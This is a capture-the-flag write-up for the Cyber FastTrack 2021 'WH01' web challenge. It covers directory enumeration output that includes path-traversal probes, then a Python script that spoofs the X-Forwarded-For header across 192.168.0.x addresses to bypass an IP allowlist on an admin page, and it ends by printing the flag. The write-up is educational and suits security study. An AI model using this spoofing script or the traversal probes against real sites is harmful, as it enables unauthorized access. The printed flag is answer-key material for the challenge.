# Cyber FastTrack Spring 2021

### Solver: Will Green ([Ducky](https://github.com/wlg0005))
### Challenge: WH01
### Category: Web (Hard)

## Description:
#### [500 pts]: Access the site at https://cfta-wh01.allyourbases.co and find a way to get the flag from the CMS.

## Walkthrough:
Navigating to the provided URL, we're presented with a simple blog page:

![](WH01%20Writeup.001.png)

Doing the standard things such as looking at the page source and analyzing the requests to the site didn't show anything interesting. So let's use [Dirsearch](https://github.com/maurosoria/dirsearch) to see if we can find any hidden directories/files:

`python3 dirsearch.py -u https://ctfa-wh01.allyourbases.co/ -e .html`

```bash
  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: html | HTTP method: GET | Threads: 30 | Wordlist size: 8913

Error Log: /media/sf_CTFs/CyberFastTrack/Web/WH01/dirsearch/logs/errors-21-04-07_16-05-25.log

Target: https://cfta-wh01.allyourbases.co/

Output File: /media/sf_CTFs/CyberFastTrack/Web/WH01/dirsearch/reports/cfta-wh01.allyourbases.co/_21-04-07_16-05-25.txt

[16:05:25] Starting: 
[16:05:27] 400 -    0B  - /..;/
[16:05:36] 200 -   16B  - /404.html
[16:05:40] 400 -    0B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[16:05:42] 304 -    0B  - /admin.html
[16:05:58] 200 -  616B  - /index.html
[16:06:08] 200 -  154B  - /readme.txt
[16:06:09] 400 -  371B  - /servlet/%C0%AE%C0%AE%C0%AF
[16:06:10] 200 -    0B  - /soap/
```

Nice, we found some hidden files! `/admin.html` is pretty interesting but if you navigate to it, you will find that it is just a blank page. So let's take a look at `/readme.txt`:

```
To use the CMS make sure to visit /admin.html from allowed IPs on the local network.

Note: Tell engineering to stop moving the subnet from 192.168.0.0/24
```

It seems that in order for us to access `/admin.html` we need to trick the server into believing that we are coming from a local IP in the `192.168.0.0/24` range.

We can accomplish this by adding the [`X-Forwarded-For`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) HTTP header and setting it to a local IP. However, if we just try an IP such as `192.168.0.1` we still get a blank page from `/admin.html`. So we need to find a specific IP that the server will recognize is on the local network.

I accomplished this by creating a script that would bruteforce all of the IPs:

```python
import requests

# admin.html url
url = 'https://cfta-wh01.allyourbases.co/admin.html'

# holds the last digit of IP
ip = 0

# while we haven't found a valid IP
while True:

    print("Trying", f"192.168.0.{ip}")
    
    # Send a GET request to the server with the X-Forwarded-For header
    # set to the current local IP
    r = requests.get(url,headers={"X-Forwarded-For":f"192.168.0.{ip}"})
    
    # if there's 'flag' in the site text, we found the flag
    if 'flag' in r.text:
        print(r.text)
        break

    ip +=1 # increment the last digit of the ip by 1
```

Running the script we find a valid IP to be `192.168.0.62` and we get the flag

### Flag: iPSpooFinGWiThHopHeaDers91918
